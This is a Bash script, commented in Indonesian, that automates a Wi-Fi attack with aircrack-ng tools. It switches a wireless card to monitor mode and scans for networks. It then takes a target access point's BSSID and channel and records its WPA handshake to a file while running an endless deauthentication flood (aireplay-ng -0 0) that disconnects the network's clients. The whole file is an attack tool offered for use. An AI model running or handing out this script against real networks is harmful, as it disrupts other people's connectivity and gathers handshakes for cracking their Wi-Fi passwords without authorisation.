#!/bin/bash

# Memeriksa apakah script dijalankan sebagai root
if [[ "$EUID" -ne 0 ]]; then
    echo "Error: Skrip ini harus dijalankan sebagai root."
    exit 1
fi

# Meminta pengguna memasukkan nama interface
read -p "Masukkan nama interface yang akan digunakan: " interface

# Memeriksa apakah nama interface tidak kosong dan valid
if [[ -z "${interface}" ]]; then
    echo "Error: Nama interface tidak boleh kosong."
    exit 1
fi

# Memeriksa keberadaan interface
if ! ip link show "${interface}" >/dev/null 2>&1; then
    echo "Error: Interface '${interface}' tidak ditemukan."
    exit 1
fi

# Menyimpan nama interface yang dipilih
interface_yang_dipilih="${interface}"

# Menampilkan informasi sebelum mengaktifkan mode monitor
echo "[*] Mengaktifkan mode monitor pada interface '${interface_yang_dipilih}' menggunakan airmon-ng..."
sleep 3
airmon-ng check kill
airmon-ng start "${interface_yang_dipilih}"

# Memulai pemindaian jaringan di sekitar menggunakan airodump-ng
echo "[*] Memulai pemindaian jaringan di sekitar menggunakan airodump-ng pada interface '${interface_yang_dipilih}'."
sleep 3
airodump-ng "${interface_yang_dipilih}"

echo ""

# Meminta pengguna memasukkan MAC address Access Point (BSSID)
read -p "Masukkan MAC address Access Point (BSSID): " bssid

# Memeriksa apakah MAC address Access Point tidak kosong dan valid
if [[ -z "${bssid}" ]]; then
    echo "Error: MAC address Access Point tidak boleh kosong."
    exit 1
fi

# Memeriksa validitas format MAC address Access Point (BSSID)
if [[ ! "${bssid}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "Error: Format BSSID tidak valid. Harap masukkan MAC address Access Point yang valid (contoh: XX:XX:XX:XX:XX:XX)."
    exit 1
fi

# Menyimpan MAC address Access Point yang dipilih
bssid_yang_dipilih="${bssid}"

echo ""

# Meminta pengguna memasukkan channel Access Point
read -p "Masukkan nomor channel yang digunakan oleh Access Point: " channel

# Memeriksa apakah channel tidak kosong dan valid
if [[ -z "${channel}" ]]; then
    echo "Error: Nomor channel tidak boleh kosong."
    exit 1
fi

# Memeriksa validitas format channel
if ! [[ "${channel}" =~ ^[0-9]+$ ]]; then
    echo "Error: Channel tidak valid. Harap masukkan nomor channel yang valid."
    exit 1
fi

# Menyimpan nomor channel yang dipilih
channel_yang_dipilih="${channel}"

echo ""

# Menangkap file handshake dari MAC address Access Point menggunakan airodump-ng pada interface yang dipilih
echo "[*] Menangkap file handshake dari MAC address '${bssid_yang_dipilih}' menggunakan airodump-ng pada interface '${interface_yang_dipilih}'."
sleep 3
xterm -e "airodump-ng --bssid ${bssid_yang_dipilih} --channel ${channel_yang_dipilih} --write ${bssid_yang_dipilih} ${interface_yang_dipilih}" & sleep 1 & xterm -e "aireplay-ng -0 0 -a ${bssid_yang_dipilih} ${interface_yang_dipilih}"
